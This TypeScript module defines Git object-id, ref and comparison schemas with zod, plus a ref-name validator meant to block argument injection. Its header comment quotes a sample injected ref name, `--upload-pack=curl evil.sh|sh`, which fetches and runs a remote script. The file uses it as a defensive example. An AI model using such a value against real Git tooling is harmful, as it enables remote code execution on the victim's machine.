/**
 * Canonical Git primitives (P0.txt §11, §124).
 *
 * The spec's warning — "do not assume SHA-1 forever" — shapes this file. Git's
 * SHA-256 transition is real and repositories using it exist, so an object id
 * carries its algorithm rather than being a bare 40-character string. A digest
 * without its algorithm is ambiguous the moment a second algorithm appears,
 * and back-filling one into millions of stored rows is far worse than carrying
 * it from the start.
 *
 * Three types, each with a distinct job:
 *
 * - {@link GitObjectId} — *what* the object is. A content hash.
 * - {@link GitRef} — *how it was reached*. An object id plus the branch or tag
 *   name that pointed at it, when a name existed. Branch names move; object
 *   ids do not. A review must record both: the name for humans, the id for
 *   reproducibility.
 * - {@link GitComparison} — *what changed*. Base, head, and merge base.
 *
 * Ref **names** are validated, not just stored. They come from provider
 * payloads and later reach `git` invocations; a name like
 * `--upload-pack=curl evil.sh|sh` is an argument-injection attempt, and the
 * cheapest place to stop it is where the value enters the domain.
 */

import { z } from "zod";
import { TEXT_LIMITS } from "../primitives/limits.js";

export const GIT_HASH_ALGORITHMS = ["sha1", "sha256"] as const;
export type GitHashAlgorithm = (typeof GIT_HASH_ALGORITHMS)[number];

/** Hex digest length per algorithm. */
const GIT_DIGEST_LENGTH: Record<GitHashAlgorithm, number> = {
  sha1: 40,
  sha256: 64,
};

/**
 * A Git object hash, tagged with the algorithm that produced it.
 *
 * Always the **full** digest — abbreviated hashes (`a1b2c3d`) are ambiguous
 * and their uniqueness depends on repository size at a moment in time, which
 * is not a property a persisted contract can rely on.
 */
export interface GitObjectId {
  readonly algorithm: GitHashAlgorithm;
  /** Lowercase hex, exactly as long as the algorithm requires. */
  readonly value: string;
}

const HEX = /^[0-9a-f]+$/;

export const gitObjectIdSchema = z
  .strictObject({
    algorithm: z.enum(GIT_HASH_ALGORITHMS),
    // Providers are inconsistent about case; normalizing on the way in means
    // two references to the same commit compare equal and hash equal (§58).
    value: z
      .string()
      .transform((value) => value.toLowerCase())
      .refine((value) => HEX.test(value), {
        error: "Git object id must be hexadecimal",
      }),
  })
  // superRefine rather than refine: the message names the expected length for
  // the *declared* algorithm, so it has to be built from the parsed value.
  // A validation error that says which length was expected is actionable; one
  // that says "invalid" is not (§96).
  .superRefine((id, ctx) => {
    const expected = GIT_DIGEST_LENGTH[id.algorithm];
    if (id.value.length !== expected) {
      ctx.addIssue({
        code: "custom",
        path: ["value"],
        message: `Expected ${String(expected)} hex characters for ${id.algorithm}, received ${String(id.value.length)}`,
      });
    }
  });

/**
 * Builds a {@link GitObjectId}, inferring the algorithm from digest length.
 *
 * Convenience for adapters, whose payloads carry a bare `sha` string with no
 * algorithm field. 40 and 64 characters are unambiguous, so the inference is
 * safe rather than a guess.
 */
export function gitObjectId(
  value: string,
  algorithm?: GitHashAlgorithm,
): GitObjectId {
  const normalized = value.toLowerCase();
  const resolved =
    algorithm ??
    (normalized.length === GIT_DIGEST_LENGTH.sha256 ? "sha256" : "sha1");
  return gitObjectIdSchema.parse({ algorithm: resolved, value: normalized });
}

/**
 * Reference-name rules, following `git check-ref-format`.
 *
 * Rejects: control characters, space, and the glob/revision metacharacters
 * `~ ^ : ? * [ \`; `..` and `@{` sequences; leading/trailing `/` or `.`; a
 * trailing `.lock`; and a leading `-`, which `git` would read as a flag.
 */
// Control characters are matched deliberately: a ref name reaches a `git`
// invocation later, and a newline in one forges a second command.
// eslint-disable-next-line no-control-regex
const REF_NAME_FORBIDDEN = /[\u0000-\u0020\u007F~^:?*[\]\\]/;

export function isValidRefName(name: string): boolean {
  if (name.length === 0 || name.length > TEXT_LIMITS.identifier) return false;
  if (REF_NAME_FORBIDDEN.test(name)) return false;
  if (name.includes("..") || name.includes("@{") || name.includes("//"))
    return false;
  if (name.startsWith("-") || name.startsWith("/") || name.startsWith("."))
    return false;
  if (name.endsWith("/") || name.endsWith(".") || name.endsWith(".lock"))
    return false;
  return true;
}

const refNameSchema = z.string().refine(isValidRefName, {
  error:
    "Invalid Git reference name (see git check-ref-format): control characters, spaces, '~^:?*[\\', '..', '@{', a leading '-' or '.', or a trailing '.lock' are not permitted",
});

/**
 * A resolved Git reference: a commit, plus the human-facing name it was
 * reached through when there was one.
 *
 * `name` is absent for a detached commit — reviewing `HEAD~3..HEAD` locally,
 * or a PR whose branch was deleted after merge. `objectId` is always present,
 * because that is what makes a review reproducible (§72).
 */
export interface GitRef {
  /** Branch or tag name, e.g. `main`, `feature/login`. Absent when detached. */
  readonly name?: string | undefined;
  readonly objectId: GitObjectId;
}

export const gitRefSchema = z.strictObject({
  name: refNameSchema.optional(),
  objectId: gitObjectIdSchema,
});

/**
 * What a review compares.
 *
 * `mergeBase` is optional but strongly preferred for pull requests. Diffing
 * `base..head` directly attributes every commit landed on the base branch
 * since the PR opened to the PR's author; diffing `mergeBase..head` shows only
 * their work. Getting this wrong means reviewing other people's code and
 * reporting findings against it.
 */
export interface GitComparison {
  readonly base: GitObjectId;
  readonly head: GitObjectId;
  readonly mergeBase?: GitObjectId | undefined;
}

export const gitComparisonSchema = z.strictObject({
  base: gitObjectIdSchema,
  head: gitObjectIdSchema,
  mergeBase: gitObjectIdSchema.optional(),
});

// -------------------------------------------------------------------------
// Equality (§124)
// -------------------------------------------------------------------------

/**
 * Structural equality for object ids.
 *
 * Compares the algorithm too: the same repository content has different
 * digests under SHA-1 and SHA-256, and two ids differing only in algorithm are
 * not "nearly equal" — they are incomparable.
 */
export function gitObjectIdsEqual(
  left: GitObjectId,
  right: GitObjectId,
): boolean {
  return left.algorithm === right.algorithm && left.value === right.value;
}

/**
 * Equality for refs, by **object id only**.
 *
 * Two refs pointing at the same commit are the same point in history whether
 * one calls it `main` and the other calls it nothing. Comparing names as well
 * would report a fast-forwarded branch as a different commit.
 */
export function gitRefsEqual(left: GitRef, right: GitRef): boolean {
  return gitObjectIdsEqual(left.objectId, right.objectId);
}

export function gitComparisonsEqual(
  left: GitComparison,
  right: GitComparison,
): boolean {
  if (!gitObjectIdsEqual(left.base, right.base)) return false;
  if (!gitObjectIdsEqual(left.head, right.head)) return false;
  if (left.mergeBase === undefined || right.mergeBase === undefined) {
    return left.mergeBase === right.mergeBase;
  }
  return gitObjectIdsEqual(left.mergeBase, right.mergeBase);
}

/** Short display form. Never use for identity or storage. */
export function abbreviate(objectId: GitObjectId, length = 7): string {
  return objectId.value.slice(0, length);
}
